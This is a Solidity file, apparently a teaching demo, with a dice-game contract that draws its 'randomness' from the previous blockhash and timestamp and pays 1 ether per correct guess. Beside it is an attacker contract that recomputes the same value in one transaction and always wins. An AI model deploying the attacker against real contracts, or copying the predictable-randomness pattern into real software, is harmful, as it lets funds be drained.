// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

contract Randomness {
    error Randomness_SentEtherError();

    function guessDice(uint8 _guessDice) public {
        uint8 dice = _random();

        if (dice == _guessDice) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            if (!sent) {
                revert Randomness_SentEtherError();
            }
        }
    }

    function _random() private view returns (uint8) {
        uint256 blockValue = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        return uint8(blockValue % 5) + 1;
    }

    function getRandom() public view returns (uint8) {
        return _random();
    }

    function getBlockTimestamp() public view returns (uint) {
        return block.timestamp;
    }

    function getBlockNumber() public view returns (uint) {
        return block.number;
    }

    function getBlockHash() public view returns (bytes32) {
        return blockhash(block.number - 1);
    }

    function getEncode(string memory _text) public pure returns (bytes memory) {
        return abi.encode(_text);
    }

    function getEncodePacked(
        string memory _text
    ) public pure returns (bytes memory) {
        return abi.encodePacked(_text);
    }

    function getHashData(string memory _text) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(_text));
    }
}

contract AttackRandomness {
    Randomness immutable i_randomness;

    constructor(address _randomness) {
        i_randomness = Randomness(_randomness);
    }

    receive() external payable {}

    function attackGuessDice() public {
        uint256 blockValue = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        uint8 guessDice = uint8(blockValue % 5) + 1;

        i_randomness.guessDice(guessDice);
    }
}
